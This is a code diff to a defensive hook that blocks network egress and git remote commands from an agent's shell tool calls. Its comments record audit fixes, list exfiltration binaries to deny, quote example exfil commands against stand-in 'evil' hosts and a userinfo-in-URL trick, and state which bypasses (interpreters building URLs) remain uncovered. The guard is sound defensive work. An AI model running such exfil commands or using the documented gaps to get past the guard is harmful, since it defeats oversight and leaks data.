@@ -45,7 +45,14 @@ const HOST_ALLOW = new Set([
 ]);
 const SSH_ALLOW = new Set(['n8n']); // the ssh config alias for the box
 
-const NET_BINARIES = /\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b/i;
+// A13-T5 (2026-09-10): the list named five binaries while the wrapper's own comment promised to deny
+// "any shell egress". Three more real exfil tools passed untouched: nslookup (DNS exfil needs no URL
+// at all, so the no-URL fail-closed rule below is what catches it), certutil -urlcache (a documented
+// Windows downloader) and bitsadmin /transfer. Interpreters that BUILD a url by concatenation
+// (python -c, node -e) are still NOT covered, and the wrapper comment now says so rather than
+// overpromising: a contract that overstates its coverage is worse than a narrow one, because it
+// stops people looking for the gap.
+const NET_BINARIES = /\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod|nslookup|certutil|bitsadmin)\b/i;
 
 // Every https?:// URL's HOST, parsed by the rules curl itself uses (WHATWG URL): the host is what
 // follows the last '@' of the authority, so `https://allowed.host@evil.example/x` is a request to
@@ -71,10 +78,19 @@ function hostsFromUrls(cmd) {
 // positive, which four organs above the guard then reported as a failed run). The argument of every
 // data-carrying flag and every heredoc body is removed before the scan; the request still goes to
 // its target, which is checked exactly as before.
-const DATA_ARG = /(?:^|\s)(?:-d|--data(?:-raw|-binary|-urlencode|-ascii)?|--json|-F|--form|--form-string|-Body)(?:=|\s+)(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|\S+)/gi;
+// The `i` flag is GONE (A13-T5, 2026-09-10). With it, a lowercase `-f` matched the `-F` alternation
+// and the strip ate the token after it, so `certutil -urlcache -split -f http://evil/x` lost its URL
+// before the scan ever saw it. curl survived only because the no-URL rule below fails closed; a
+// non-curl binary did not. This is the residual of the A13-T6 fix, found by the next audit pass.
+const DATA_ARG = /(?:^|\s)(?:-d|--data(?:-raw|-binary|-urlencode|-ascii)?|--json|-F|--form|--form-string|-[Bb]ody)(?:=|\s+)(?:'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|\S+)/g;
 const HEREDOC = /<<-?\s*['"]?(\w+)['"]?[^\n]*\n[\s\S]*?\n[ \t]*\1\b/g;
-function stripDataArgs(cmd) {
-  return cmd.replace(HEREDOC, ' ').replace(DATA_ARG, ' ');
+// `keepHeredoc` lets the caller decide what a heredoc body means for the question being asked. The
+// default strips it (bodies are data), which is what the git-verb scan wants; the network scan keeps
+// it when the command is not a network call, because there the body may be a script about to run.
+function stripDataArgs(cmd, opts) {
+  const keepHeredoc = Boolean(opts && opts.keepHeredoc);
+  const withoutHeredoc = keepHeredoc ? cmd : cmd.replace(HEREDOC, ' ');
+  return withoutHeredoc.replace(DATA_ARG, ' ');
 }
 
 // git / gh remote verbs, found by TOKENISING each shell segment instead of a `git\s+push` regex
@@ -135,11 +151,22 @@ function evaluate(hook) {
   if (tool !== 'Bash' && tool !== 'PowerShell') return null;
 
   const c = String(((hook && hook.tool_input) || {}).command || '');
-  const scan = stripDataArgs(c); // destinations only; bodies and heredocs are data
-  for (const verb of remoteVerbs(scan)) {
+  // TWO scans, because a heredoc body is a different thing to each question (A13-T5, 2026-09-10).
+  //   verbScan  - heredocs always stripped. A `git push` written inside a heredoc is TEXT being
+  //               written to a file, not a command being run, and denying it is a false positive
+  //               (pinned by a regression case since the guard was built).
+  //   netScan   - heredocs stripped ONLY for a network binary, where the body really is the request
+  //               payload. Everywhere else the body may be a SCRIPT that is about to execute, and
+  //               stripping it hid `python - <<EOF ... requests.post("https://evil") ... EOF`
+  //               entirely.
+  // One scan could not serve both: making it text lost real egress, keeping it live cried wolf.
+  const verbScan = stripDataArgs(c);
+  const netScan = stripDataArgs(c, { keepHeredoc: !NET_BINARIES.test(c.split(String.fromCharCode(10))[0]) });
+  for (const verb of remoteVerbs(verbScan)) {
     if (verb.startsWith('gh ')) return { reason: 'gh (GitHub CLI) is not allowed in an untrusted lane', detail: c };
     return { reason: 'git remote operations are not allowed in an untrusted lane', detail: c };
   }
+  const scan = netScan;
   const urlHosts = hostsFromUrls(scan);
   for (const h of urlHosts) {
     if (!HOST_ALLOW.has(h)) return { reason: `URL host '${h}' is not on the lane allowlist`, detail: c };
